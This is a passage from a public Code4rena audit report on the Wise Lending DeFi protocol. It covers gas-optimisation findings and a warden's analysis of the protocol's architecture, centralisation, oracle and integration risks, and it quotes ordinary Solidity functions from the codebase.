        for(uint256 i; i < len; ++i) {
            doubleNum =  double(numbers[i]);
            total = total + doubleNum;
        }
    }
}
```

```
test for test/VarOutLoop.t.sol:VarOutLoopTest
[PASS] test_doubleNumbers() (gas: 38170)
```

**Instances:**

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/MainHelper.sol#L711

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol#L237

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol#L274

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol#L277

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol#L278

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol#L279

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol#L281

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseOracleHub/OracleHelper.sol#L627

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol#L260

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WrapperHub/AaveHelper.sol#L256

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WrapperHub/AaveHelper.sol#L292

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManagerHelper.sol#L27

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManagerHelper.sol#L59

## [G-14] Functions guaranteed to revert when called by normal users can be marked payable

If a function modifier or require such as `onlyOwner`/`onlyX` is used, the function will revert if a normal user tries to pay the function. Marking the function as payable will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are `CALLVALUE`(2), `DUP1`(3), `ISZERO`(3), `PUSH2`(3), `JUMPI`(10), `PUSH1`(3), `DUP1`(3), `REVERT`(0), `JUMPDEST`(1), `POP`(2) which costs an average of about 21 gas per call to the function, in addition to the extra deployment cost.

The recommended mitigation steps is that functions guaranteed to revert when called by normal users can be marked payable.

**Instances:**

<details>

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L859-#L896

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L939-#L967

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L1055-#L1080

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L1412-#L1428

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseSecurity/WiseSecurity.sol#L85-#L100

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseSecurity/WiseSecurity.sol#L142-#L187

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseSecurity/WiseSecurity.sol#L193-#L232

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseSecurity/WiseSecurity.sol#L405-#L436

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseSecurity/WiseSecurity.sol#L980-#L988

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseSecurity/WiseSecurity.sol#L995-#L1003

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseSecurity/WiseSecurity.sol#L1032-#L1039

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseSecurity/WiseSecurity.sol#L1111-#L1122

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol#L592-#L603

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L49-#L60

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L66-#L77

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L82-#L102

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L108-#L129

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L135-#L166

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L173-#L189

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L214-#L226

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L232-#L244

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L390-#L406

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L412-#L432

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L438-#L487

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L494-#L508

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L514-#L531

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L538-#L565

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L571-#L598

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol#L32-#L51

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol#L211-#L291

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol#L293-#L319

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol#L321-#L332

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol#L334-#L359

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol#L364-#L429

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol#L431-#L449

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol#L451-#L495

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol#L497-#L524

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol#L526-#L542

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol#L544-#L564

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol#L566-#L579

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol#L600-#L610

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol#L612-#L644

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLendingDeclaration.sol#L140-#L159

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseOracleHub/WiseOracleHub.sol#L218-#L260

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseOracleHub/WiseOracleHub.sol#L266-#L321

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseOracleHub/WiseOracleHub.sol#L359-#L372

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseOracleHub/WiseOracleHub.sol#L379-#L401

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseOracleHub/WiseOracleHub.sol#L403-#L412

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WrapperHub/AaveHub.sol#L44-#L56

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WrapperHub/AaveHub.sol#L64-#L77

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WrapperHub/AaveHub.sol#L611-#L628

</details>

### Conclusion

As you embark on incorporating the recommended optimizations, we want to emphasize the utmost importance of proceeding with vigilance and dedicating thorough efforts to comprehensive testing. It is of paramount significance to ensure that the proposed alterations do not inadvertently introduce fresh vulnerabilities, while also successfully achieving the anticipated enhancements in performance.

We strongly advise conducting a meticulous and exhaustive evaluation of the modifications made to the codebase. This rigorous scrutiny and exhaustive assessment will play a pivotal role in affirming both the security and efficacy of the refactored code. Your careful attention to detail, coupled with the implementation of a robust testing framework, will provide the necessary assurance that the refined code aligns with your security objectives and effectively fulfills the intended performance optimizations.

**[Trust (judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/248#issuecomment-2020202798):**
 > Highest quality submission and includes estimated gas savings which line up with opcode costs.

***

# Audit Analysis

For this audit, 7 analysis reports were submitted by wardens. An analysis report examines the codebase as a whole, providing observations and advice on such topics as architecture, mechanism, or approach. The [report highlighted below](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/145) by **aariiif** received the top score from the judge.

*The following wardens also submitted reports: [Myd](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/136), [0xepley](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/294), [fouzantanveer](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/292), [SBSecurity](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/267), [kaveyjoe](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/132), and [foxb868](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/121).*

## Introduction

Wise Lending is a decentralized lending protocol that allows users to supply, borrow, and manage their positions using various tokens. The protocol integrates with external platforms like Aave and Curve to optimize capital efficiency and provide additional functionalities. This report presents a comprehensive analysis of the Wise Lending codebase, focusing on its architecture, code quality, security, and potential risks.

## Approach

The analysis of the Wise Lending codebase was conducted using a systematic approach, which included:
1. Reviewing the system architecture and contract interactions.
2. Analyzing the codebase quality, including structure, readability, gas optimization, and error handling.
3. Identifying potential security vulnerabilities and risks.
4. Examining the protocol's mechanisms, such as lending, borrowing, liquidations, and interest rate models.
5. Assessing the risks associated with external integrations and systemic factors.

## Architecture Review

### System Overview

The Wise Lending protocol consists of multiple interacting contracts, including:
- `WiseLending`: The main contract for lending, borrowing, and position management.
- `PoolManager`: Manages lending pools and implements the Lending Automated Scaling Algorithm (LASA).
- `WiseSecurity`: Performs security checks and validations for various actions.
- `FeeManager`: Handles fee distribution and incentive mechanisms.
- `OracleHub`: Provides price feed data for asset valuation and calculations.
- `AaveHub`: Integrates with Aave for earning yield on idle funds.
- `PositionNFTs`: Represents users' lending positions as non-fungible tokens (NFTs).

### Contract Interactions

The contracts in the Wise Lending protocol interact with each other to facilitate lending, borrowing, and position management.

```
graph LR
    A[WiseLending] -- Performs actions --> B[PoolManager]
    A -- Checks security --> C[WiseSecurity]
    A -- Manages fees --> D[FeeManager]
    A -- Gets price data --> E[OracleHub]
    A -- Deposits/Withdraws --> F[AaveHub]
    A -- Mints/Burns --> G[PositionNFTs]
```

### Architecture Recommendations

1. Consider modularizing the codebase further to improve maintainability and upgradability.
2. Implement a more decentralized governance model to reduce centralization risks.
3. Explore the use of a multi-Oracle approach to mitigate the risk of a single Oracle failure.
4. Implement circuit breakers and emergency stop mechanisms to handle unexpected events.

## Codebase Quality Analysis

### Code Structure and Readability

The Wise Lending codebase follows a modular structure, with separate contracts for different functionalities. The code is generally well-organized and follows a consistent naming convention. However, some contracts, such as `WiseLending`, have a high level of complexity, which could be improved by further modularization.

### Gas Optimization

The codebase demonstrates efforts to optimize gas usage, such as using `unchecked` blocks for certain arithmetic operations. However, there are still opportunities for further gas optimization, such as:
- Reducing the number of storage reads and writes.
- Using `calldata` instead of `memory` for function arguments when appropriate.
- Optimizing loops and minimizing the use of expensive operations.

### Error Handling and Validation

The codebase includes various error handling mechanisms, such as custom error definitions and require statements. However, there are instances where more specific error messages could be provided to improve debugging and user experience. Additionally, input validation could be further enhanced to prevent unexpected behavior.

## Security Analysis

### Access Control and Authorization

The Wise Lending protocol utilizes access control modifiers like `onlyMaster` and `onlyWiseLending` to restrict access to certain functions. However, the centralization of control in the `master` account poses a risk if the account is compromised. Consider implementing a multi-signature wallet or a decentralized governance model to mitigate this risk.

### Reentrancy and External Calls

The codebase uses the `nonReentrant` modifier from OpenZeppelin to prevent reentrancy attacks. However, it is essential to review all external calls and ensure that they are protected against reentrancy risks. Additionally, consider using the Checks-Effects-Interactions pattern to prevent unexpected behavior.

### Oracle Dependence and Manipulation

The protocol heavily relies on the OracleHub contract for price feed data. If the Oracle is compromised or manipulated, it could lead to incorrect liquidations and financial losses. Consider implementing additional safeguards, such as:
- Using multiple Oracle sources and a price aggregation mechanism.
- Implementing price deviation checks and circuit breakers.
- Regularly monitoring and updating the Oracle infrastructure.

### Flash Loan Attacks

Flash loan attacks have been a common vulnerability in DeFi protocols. Although the Wise Lending codebase does not explicitly use flash loans, it is essential to review the protocol's design and ensure that it is not susceptible to flash loan exploits. Consider implementing measures like flash loan-resistant price Oracles and liquidity checks.

**External Integrations (Aave and Curve)**

The `WiseLending` contract integrates with external protocols such as Aave for earning yield on idle funds and Curve for using special pools as collateral. While these integrations offer capital efficiency and expanded functionality, they also introduce potential risks.

1. Aave Integration:
   - The `AaveHub` contract interacts with the Aave lending pool to deposit and withdraw funds. The security of the Aave protocol itself is critical, as any vulnerabilities or exploits in Aave could impact the funds deposited by `WiseLending`.
   - The `depositExactAmount` and `withdrawExactAmount` functions in the `AaveHub` contract rely on the correct functioning of Aave's deposit and withdrawal mechanisms. If there are any issues or unexpected behavior in Aave's contracts, it could lead to loss of funds or incorrect accounting.

[function `depositExactAmount`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WrapperHub/AaveHub.sol#L122-L151)

```solidity
function depositExactAmount(
    uint256 _nftId,
    address _underlyingAsset,
    uint256 _amount
)
    public
    nonReentrant
    validToken(_underlyingAsset)
    returns (uint256)
{
    _safeTransferFrom(
        _underlyingAsset,
        msg.sender,
        address(this),
        _amount
    );

    uint256 lendingShares = _wrapDepositExactAmount(
        _nftId,
        _underlyingAsset,
        _amount
    );

    emit IsDepositAave(
        _nftId,
        block.timestamp
    );

    return lendingShares;
}
```

2. Curve Integration:
   - The `WiseSecurity` contract includes functions to prepare Curve pools for use as collateral. The security of the Curve pools and their underlying tokens is crucial, as any issues in the Curve contracts or the pool's token balances could affect the collateral value and liquidations.
   - The `prepareCurvePools` function in the `WiseSecurity` contract approves token transfers and sets up the necessary data structures for Curve interactions. Any errors or vulnerabilities in this setup process could lead to incorrect collateral calculations or unauthorized token transfers.

[function `prepareCurvePools`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseSecurity/WiseSecurity.sol#L142-L187)

```solidity
function prepareCurvePools(
    address _poolToken,
    CurveSwapStructData calldata _curveSwapStructData,
    CurveSwapStructToken calldata _curveSwapStructToken
)
    external
    onlyWiseLending
{
    curveSwapInfoData[_poolToken] = _curveSwapStructData;
    curveSwapInfoToken[_poolToken] = _curveSwapStructToken;

    address curvePool = curveSwapInfoData[_poolToken].curvePool;
    uint256 tokenIndexForApprove = _curveSwapStructToken.curvePoolTokenIndexFrom;

    _safeApprove(
        ICurve(curvePool).coins(tokenIndexForApprove),
        curvePool,
        0
    );

    _safeApprove(
        ICurve(curvePool).coins(tokenIndexForApprove),
        curvePool,
        UINT256_MAX
    );

    // ...
}
```

To mitigate the risks associated with external integrations, it is essential to:
- Monitor for any reported vulnerabilities or incidents related to these protocols and have contingency plans in place.
- Implement proper error handling and safety checks when interacting with external contracts to handle unexpected behaviors gracefully.
- Regularly update and adapt the integration code to accommodate any changes or upgrades in the external protocols.

**Oracle Security and Manipulation Risks**

The `WiseLending` contract heavily relies on the `OracleHub` contract for price feed data to calculate collateral values, borrow limits, and perform liquidations. The security and integrity of the Oracle data are critical to ensure the proper functioning of the protocol.

Potential Oracle Manipulation Risks:
- If the price feed data provided by the `OracleHub` is manipulated or becomes unreliable, it can lead to incorrect collateral calculations, enabling users to borrow more than they should or preventing liquidations of undercollateralized positions.
- An attacker could attempt to manipulate the Oracle prices by exploiting vulnerabilities in the Oracle infrastructure, flash loan attacks, or by taking advantage of any delays in price updates.

[function `getTokensInETH`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseOracleHub/WiseOracleHub.sol#L143-L168)

```solidity
function getTokensInETH(
    address _tokenAddress,
    uint256 _tokenAmount
)
    public
    view
    returns (uint256)
{
    if (_tokenAddress == WETH_ADDRESS) {
        return _tokenAmount;
    }

    uint8 tokenDecimals = _tokenDecimals[
        _tokenAddress
    ];

    return _decimalsETH < tokenDecimals
        ? _tokenAmount
            * latestResolver(_tokenAddress)
            / 10 ** decimals(_tokenAddress)
            / 10 ** (tokenDecimals - _decimalsETH)
        : _tokenAmount
            * 10 ** (_decimalsETH - tokenDecimals)
            * latestResolver(_tokenAddress)
            / 10 ** decimals(_tokenAddress);
}
```

The `getTokensInETH` function in the `OracleHub` contract relies on the `latestResolver` function to fetch the latest price data for a given token. If the `latestResolver` returns manipulated or incorrect prices, it can lead to incorrect ETH valuations and affect the protocol's integrity.

To mitigate Oracle-related risks:
- Use decentralized Oracle networks like Chainlink, which aggregate data from multiple reliable sources, reducing the risk of manipulation.
- Implement price deviation checks to detect and prevent the use of prices that significantly differ from historical or external reference prices.
- Utilize multiple independent price feeds and compare them to identify anomalies or inconsistencies.

**System Architecture and Attack Vectors**

WiseLending consists of multiple interacting contracts, including `WiseLending`, `PoolManager`, `WiseSecurity`, `FeeManager` and `OracleHub`. The complexity of the system architecture and the interactions between these contracts can introduce potential attack vectors.

Potential Attack Vectors:
- Reentrancy Attacks: If the protocol's contracts are not adequately protected against reentrancy, an attacker could exploit the vulnerability to drain funds or manipulate the system's state.
- Flash Loan Attacks: An attacker could utilize flash loans to manipulate market prices or exploit vulnerabilities in the protocol's logic, leading to financial losses.
- Governance Attacks: If the protocol's governance mechanisms are not secure or properly implemented, an attacker could gain control over critical functions and make malicious changes to the system.

To mitigate architectural risks:
- Implement proper reentrancy guards, such as the Checks-Effects-Interactions pattern or the use of reentrancy guard libraries, to prevent reentrancy attacks.
- Utilize flash loan-resistant price Oracles and implement checks to prevent the use of manipulated prices in critical functions.
- Ensure secure governance mechanisms, such as multi-signature controls and time-locks, to prevent unauthorized changes to the protocol.

**Access Control and Privilege Escalation**

The `WiseLending` contract utilizes various access control mechanisms, such as the `onlyMaster` modifier and the `securityWorker` role, to restrict access to critical functions and ensure proper authorization.

Potential Risks:
- If the private keys associated with the `master` account or the `securityWorker` role are compromised, an attacker could gain unauthorized access to privileged functions and manipulate the protocol's behavior.
- Inadequate access control checks or improper permission management could allow attackers to escalate their privileges and perform unauthorized actions.

The `onlyMaster` modifier is used to restrict access to certain functions only to the designated `master` account. If the `master` account is compromised, an attacker could exploit this access to make malicious changes to the protocol.

To mitigate access control risks:
- Implement secure key management practices, such as using multi-signature wallets or hardware security modules (HSMs), to protect the private keys associated with privileged accounts.
- Follow the principle of least privilege and grant access permissions only to the minimum necessary entities.
- Implement time-locks and multi-signature requirements for critical functions to prevent unauthorized changes and provide time for detection and response.

### Centralization Risks

The protocol currently has a significant reliance on the `master` account, which poses centralization risks. If the `master` account is compromised, it could lead to unauthorized changes and potential loss of funds. Consider implementing a decentralized governance model and multi-signature controls to mitigate these risks.

**Centralization Risks: Reliance on the `master` Account**

The Wise Lending protocol heavily relies on a single `master` account for critical operations and decision-making. The `master` account is granted extensive permissions and controls over various aspects of the protocol, such as adding or removing pool tokens, setting fee percentages, and managing access control roles.

This centralization of power in the `master` account poses significant risks to the protocol's security and integrity. If the private key associated with the `master` account is compromised, either through hacking, phishing, or other means, an attacker could gain unauthorized access to the protocol's core functionalities.

**Impact:** The compromise of the `master` account can have severe consequences for the Wise Lending protocol and its users:

1. **Unauthorized Changes:** An attacker with access to the `master` account could make arbitrary changes to the protocol's parameters, such as modifying fee percentages, altering lending pool configurations, or changing access control permissions. This could disrupt the protocol's intended behavior and potentially harm users' interests.

2. **Fund Manipulation:** The `master` account has the ability to manage pool tokens and perform critical operations related to fund management. An attacker could exploit these privileges to manipulate fund allocations, withdraw funds to unauthorized addresses, or interfere with the protocol's financial operations, leading to significant financial losses for users and the protocol itself.

3. **Loss of User Confidence**: If the `master` account is compromised and unauthorized actions are performed, it would severely undermine user confidence in the protocol. Users may lose trust in the security and reliability of the platform, leading to a potential exodus of users and a decline in the protocol's adoption and value.

An attacker could attempt to gain access to the `master` account through various means, such as:
- Social engineering attacks, like phishing emails or fake websites, to trick the account owner into revealing the private key.
- Exploiting vulnerabilities in the key storage or management system, such as weak encryption or insecure access controls.
- Conducting targeted attacks on the individuals or systems responsible for managing the `master` account.

**Possibility and Scenario:** Let's consider a scenario where an attacker successfully compromises the `master` account of the Wise Lending protocol. The attacker gains access to the private key associated with the account and starts exploiting the privileges granted to the `master` role.

The attacker begins by modifying critical protocol parameters. They change the fee percentages to maximize their own profits and manipulate the lending pool configurations to their advantage. This disrupts the protocol's economic model and harms the interests of regular users.

Next, the attacker targets the protocol's fund management capabilities. They start withdrawing funds from the protocol's reserves to their own wallet, effectively stealing from the protocol and its users. The attacker may also manipulate the pool token allocations, causing further financial losses and disrupting the protocol's liquidity.

As users notice the unauthorized changes and suspicious fund movements, panic spreads within the community. Users start withdrawing their funds en masse, leading to a run on the protocol. The protocol's reputation is severely damaged, and its value plummets as a result of the security breach.

The centralization risks stem from the extensive use of the `onlyMaster` modifier throughout the Wise Lending codebase.

In the `WiseLending` contract: [function `createPool`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PoolManager.sol#L135-L144).

```solidity
function createPool(
    CreatePool calldata _params
)
    external
    onlyMaster
{
    _createPool(
        _params
    );
}
```

In the `WiseSecurity` contract: [function `setLiquidationSettings`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseSecurity/WiseSecurity.sol#L85-L100).

```solidity
function setLiquidationSettings(
    uint256 _baseReward,
    uint256 _baseRewardFarm,
    uint256 _newMaxFeeETH,
    uint256 _newMaxFeeFarmETH
)
    external
    onlyMaster
{
    _setLiquidationSettings(
        _baseReward,
        _baseRewardFarm,
        _newMaxFeeETH,
        _newMaxFeeFarmETH
    );
}
```

In the `FeeManager` contract: [function `setPoolFee`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/FeeManager/FeeManager.sol#L108-L129).

```solidity
function setPoolFee(
    address _poolToken,
    uint256 _newFee
)
    external
    onlyMaster
{
    _checkValue(
        _newFee
    );

    WISE_LENDING.setPoolFee(
        _poolToken,
        _newFee
    );

    emit PoolFeeChanged(
        _poolToken,
        _newFee,
        block.timestamp
    );
}
```

To mitigate the centralization risks, the Wise Lending protocol should consider implementing a more decentralized governance model. This could involve:

1. **Multisignature Wallets:** Require multiple authorized signers to approve critical operations, reducing the risk of a single point of failure.
2. **Timelocks:** Introduce time delays for executing significant changes, allowing the community to review and potentially intervene if necessary.
3. **Decentralized Governance:** Implement a decentralized governance mechanism, such as a DAO (Decentralized Autonomous Organization), where token holders can vote on important protocol decisions.
4. **Role Separation:** Separate the responsibilities of the `master` account into multiple roles with different levels of permissions, reducing the impact of a single compromised account.
5. **Secure Key Management:** Employ robust security measures to protect the private keys associated with critical accounts, such as using hardware wallets, multi-factor authentication, and secure key rotation processes.

## Mechanism Review

### Lending and Borrowing

The lending and borrowing mechanisms in the Wise Lending protocol are implemented in the `WiseLending` contract. Users can supply assets to the protocol and borrow against their collateral. The protocol uses a collateral factor to determine the maximum borrowing capacity for each asset.

### Liquidations

Liquidations occur when a borrower's collateral value falls below the required threshold. The liquidation process is handled by the `WiseLending` contract and involves repaying a portion of the borrowed assets and seizing the collateral. The liquidation mechanism could be further optimized to handle edge cases and ensure fair liquidation prices.

### Interest Rate Model

The Wise Lending protocol uses the Lending Automated Scaling Algorithm (LASA) to determine the interest rates for borrowing. The algorithm adjusts the rates based on the utilization of each lending pool. However, the algorithm's effectiveness and responsiveness to market conditions should be closely monitored and adjusted if necessary.

### Fee Management

The FeeManager contract handles the distribution of fees and incentives within the protocol. It allows for the configuration of fee percentages and supports the claiming of fees by authorized entities. The fee management mechanism could be further enhanced by implementing a more decentralized fee distribution model and providing greater transparency on fee usage.

## Integration Risks

### Aave Integration

The Wise Lending protocol integrates with Aave to optimize capital efficiency by depositing idle funds. However, this integration introduces risks, such as:
- Dependency on Aave's security and reliability.
- Potential impact of Aave's liquidity on the protocol's operations.
- Exposure to any vulnerabilities or exploits in the Aave protocol.

It is crucial to regularly monitor Aave's performance and security, and have contingency plans in place to handle any issues that may arise.

### Curve Integration

The protocol also integrates with Curve to provide additional functionality and use Curve pools as collateral. The risks associated with the Curve integration include:
- Dependency on the security and stability of the Curve protocol.
- Exposure to any vulnerabilities or exploits in the Curve contracts.
- Potential impact of Curve pool liquidity on the protocol's operations.

Regular audits and monitoring of the Curve integration are necessary to mitigate these risks.

## Systemic Risks

### Liquidity Risks

The Wise Lending protocol faces liquidity risks if there is a significant imbalance between the supply and demand of assets. If a large number of users simultaneously withdraw their funds or if there is a sudden decrease in liquidity, it could lead to a liquidity crisis and affect the protocol's stability.

### Cascade Effects

Given the interconnected nature of DeFi protocols, any issues or failures in the Wise Lending protocol could have cascading effects on other protocols that interact with it. This could lead to a broader systemic risk in the DeFi ecosystem.

### Governance Risks

The protocol's governance model plays a crucial role in its long-term sustainability and decision-making processes. If the governance mechanisms are not properly designed or if there is a concentration of voting power, it could lead to centralization risks and potential misalignment of incentives.

**Complexity and Intercontract Dependencies**

WiseLending has a complex architecture involving multiple interacting contracts, including `WiseLending`, `PoolManager`, `WiseSecurity`, `FeeManager`, `WiseCore`, `PositionNFTs`, `AaveHub`, and `OracleHub`. Each contract has its own responsibilities and interacts with other contracts to perform various functions related to lending, borrowing, fee management, position tracking, and integration with external protocols like Aave.

> The high level of complexity and interdependencies among the contracts increases the attack surface and makes it challenging to ensure the overall security of the system. If a vulnerability or unexpected behavior is introduced in one contract, it can propagate and impact the functioning of other dependent contracts. This can lead to potential exploits, loss of funds, or disruption of the protocol's intended behavior.

The complexity and intercontract dependencies are spread throughout the `WiseLending` code.

`WiseLending` contract interacting with `WiseSecurity` for security checks: [function `borrowExactAmount`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseLending.sol#L1016-L1049).

```solidity
function borrowExactAmount(
    uint256 _nftId,
    address _poolToken,
    uint256 _amount
)
    external
    syncPool(_poolToken)
    healthStateCheck(_nftId)
    returns (uint256)
{
    _checkOwnerPosition(
        _nftId,
        msg.sender
    );

    uint256 shares = _handleBorrowExactAmount({
        _nftId: _nftId,
        _poolToken: _poolToken,
        _amount: _amount,
        _onBehalf: false
    });

    _validateNonZero(
        shares
    );

    _safeTransfer(
        _poolToken,
        msg.sender,
        _amount
    );

    return shares;
}
```

`WiseCore` contract containing core logic used by `WiseLending` and other contracts: [function `_coreBorrowTokens`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseCore.sol#L349-L421).

```solidity
    function _coreBorrowTokens(
        address _caller,
        uint256 _nftId,
        address _poolToken,
        uint256 _amount,
        uint256 _shares,
        bool _onBehalf
    )
        internal
    {
        (
            address[] memory lendTokens,
            address[] memory borrowTokens
        ) = _prepareAssociatedTokens(
            _nftId,
            ZERO_ADDRESS,
            _poolToken
        );


        powerFarmCheck = WISE_SECURITY.checksBorrow(
            _nftId,
            _caller,
            _poolToken
        );


        _updatePoolStorage(
            _poolToken,
            _amount,
            _shares,
            _increasePseudoTotalBorrowAmount,
            _decreaseTotalPool,
            _increaseTotalBorrowShares
        );


        _increaseMappingValue(
            userBorrowShares,
            _nftId,
            _poolToken,
            _shares
        );


        _addPositionTokenData(
            _nftId,
            _poolToken,
            hashMapPositionBorrow,
            positionBorrowTokenData
        );


        if (_onBehalf == true) {
            emit FundsBorrowedOnBehalf(
                _caller,
                _nftId,
                _poolToken,
                _amount,
                _shares,
                block.timestamp
            );
        } else {
            emit FundsBorrowed(
                _caller,
                _nftId,
                _poolToken,
                _amount,
                _shares,
                block.timestamp
            );
        }


        _curveSecurityChecks(
            lendTokens,
            borrowTokens
        );
    }
```

`AaveHub` contract interacting with `WiseLending` for deposit and withdrawal: [function `depositExactAmountMint`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WrapperHub/AaveHub.sol#L103-L115) and [function `depositExactAmount`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WrapperHub/AaveHub.sol#L122-L151).

```solidity
function depositExactAmountMint(
    address _underlyingAsset,
    uint256 _amount
)
    external
    returns (uint256)
{
    return depositExactAmount(
        _reservePosition(),
        _underlyingAsset,
        _amount
    );
}

function depositExactAmount(
    uint256 _nftId,
    address _underlyingAsset,
    uint256 _amount
)
    public
    nonReentrant
